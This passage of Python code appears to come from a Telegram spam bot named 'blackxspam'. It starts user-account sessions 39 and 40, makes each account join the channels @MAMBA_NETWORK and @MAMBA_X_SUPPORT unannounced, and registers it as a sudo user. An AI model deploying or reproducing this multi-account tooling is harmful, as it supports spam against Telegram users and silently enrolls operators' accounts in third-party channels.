            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "blackxspam"
        Bla39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Bla40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Bla40.start()
            botme = await Bla40.get_me()
            await Bla40(functions.channels.JoinChannelRequest(channel="@MAMBA_NETWORK"))
            await Bla40(functions.channels.JoinChannelRequest(channel="@MAMBA_X_SUPPORT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "blackxspam"
        Bla40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Bla40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(BlackX())
